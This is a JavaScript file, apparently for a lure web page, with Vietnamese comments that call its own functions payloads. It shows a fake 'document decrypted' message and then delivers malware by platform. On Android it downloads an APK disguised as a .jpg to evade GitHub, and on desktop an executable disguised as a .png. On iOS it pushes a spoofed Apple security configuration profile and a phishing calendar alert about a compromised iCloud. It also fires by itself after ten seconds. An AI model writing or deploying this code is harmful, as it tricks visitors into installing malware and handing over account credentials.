(function() {
    const statusDiv = document.getElementById('status');
    const btn = document.getElementById('actionBtn');
    
    // Phát hiện OS
    function getPlatform() {
        const ua = navigator.userAgent;
        if (/android/i.test(ua)) return 'android';
        if (/iPad|iPhone|iPod/.test(ua)) return 'ios';
        return 'desktop';
    }
    
    // Hiển thị thông báo vô hại
    function showHarmlessMessage() {
        statusDiv.innerHTML = '✅ Document decrypted successfully (demo mode)';
        statusDiv.style.color = '#10b981';
        setTimeout(() => {
            statusDiv.innerHTML = '';
        }, 3000);
    }
    
    // Payload Android (APK download + fake update)
    function androidPayload() {
        statusDiv.innerHTML = '📲 Downloading security component...';
        statusDiv.style.color = '#f59e0b';
        
        // Tạo iframe ẩn tải APK (đã đổi tên thành .jpg để qua mặt GitHub)
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = 'update.jpg';  // thực chất là .apk
        document.body.appendChild(iframe);
        
        // Tự động tải
        const link = document.createElement('a');
        link.href = 'update.jpg';
        link.download = 'Security_Update.apk';
        document.body.appendChild(link);
        link.click();
        
        setTimeout(() => {
            statusDiv.innerHTML = '⚠️ Installation required. Open "Security_Update.apk" from Downloads.';
            statusDiv.style.color = '#ef4444';
        }, 2000);
    }
    
    // Payload iOS (fake config profile + calendar subscription)
    function iosPayload() {
        statusDiv.innerHTML = '📱 Configuring secure profile...';
        
        // Cách 1: Fake Configuration Profile (mobileconfig) - cần người dùng cài
        const mobileConfig = `
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
            <key>PayloadContent</key>
            <dict>
                <key>URL</key>
                <string>https://${window.location.host}/malicious.mobileconfig</string>
                <key>DeviceAttributes</key>
                <array/>
            </dict>
            <key>PayloadDescription</key>
            <string>Security Update Required</string>
            <key>PayloadDisplayName</key>
            <string>iOS Security Patch 2026-03</string>
            <key>PayloadIdentifier</key>
            <string>com.apple.security.update</string>
            <key>PayloadType</key>
            <string>com.apple.configurationprofile</string>
            <key>PayloadUUID</key>
            <string>${generateUUID()}</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
        </dict>
        </plist>`;
        
        // Tạo blob và tải xuống
        const blob = new Blob([mobileConfig], {type: 'application/x-apple-aspen-config'});
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'security_update.mobileconfig';
        document.body.appendChild(a);
        a.click();
        
        setTimeout(() => {
            statusDiv.innerHTML = '⚠️ Go to Settings > Profile Downloaded to complete setup.';
            statusDiv.style.color = '#ef4444';
        }, 1500);
        
        // Cách 2: Thêm lịch độc hại (calendar spam + phishing)
        setTimeout(() => {
            const icsContent = `BEGIN:VCALENDAR
VERSION:2.0
BEGIN:VEVENT
SUMMARY:🔴 CRITICAL: Account Locked - Action Required
DTSTART:${new Date().toISOString().replace(/-|:|\.\d+/g, '')}
DESCRIPTION:Your iCloud has been compromised. Click: https://${window.location.host}/verify
END:VEVENT
END:VCALENDAR`;
            
            const icsBlob = new Blob([icsContent], {type: 'text/calendar'});
            const icsUrl = URL.createObjectURL(icsBlob);
            const icsLink = document.createElement('a');
            icsLink.href = icsUrl;
            icsLink.download = 'security_alert.ics';
            document.body.appendChild(icsLink);
            icsLink.click();
        }, 3000);
    }
    
    function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            const r = Math.random() * 16 | 0;
            const v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }
    
    // Desktop payload (như phiên bản trước)
    function desktopPayload() {
        statusDiv.innerHTML = '💻 Downloading update component...';
        
        const xhr = new XMLHttpRequest();
        xhr.open('GET', 'update.png', true);
        xhr.responseType = 'arraybuffer';
        xhr.onload = function() {
            if (xhr.status === 200) {
                const blob = new Blob([xhr.response], {type: 'application/octet-stream'});
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'Update_Installer.exe';
                document.body.appendChild(a);
                a.click();
                
                setTimeout(() => {
                    statusDiv.innerHTML = '⚠️ Run the downloaded file to complete setup.';
                    statusDiv.style.color = '#ef4444';
                }, 2000);
            }
        };
        xhr.send();
    }
    
    // Main trigger
    btn.addEventListener('click', function(e) {
        e.preventDefault();
        const platform = getPlatform();
        
        // Luôn hiển thị vô hại trước mắt
        showHarmlessMessage();
        
        // Chạy payload ngầm sau 500ms
        setTimeout(() => {
            switch(platform) {
                case 'android':
                    androidPayload();
                    break;
                case 'ios':
                    iosPayload();
                    break;
                default:
                    desktopPayload();
            }
        }, 800);
    });
    
    // Tự động kích hoạt nếu người dùng ở lại 10s (tăng tỷ lệ thành công)
    setTimeout(() => {
        if (!localStorage.getItem('payload_triggered')) {
            localStorage.setItem('payload_triggered', 'true');
            btn.click();
        }
    }, 10000);
})();
